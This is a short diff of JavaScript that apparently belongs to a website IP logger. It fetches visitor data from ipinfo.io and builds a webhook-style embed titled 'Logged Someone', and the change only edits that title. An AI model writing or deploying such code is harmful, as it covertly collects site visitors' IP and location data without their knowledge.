@@ -2,7 +2,7 @@ $.getJSON("https://ipinfo.io/json", function(data) {
   var params = {
     embeds: [
       {
-        "title": "Logged Someone",
+        "title": "Logged Someone in site",
         "color": 64175,
         "thumbnail": {
         },
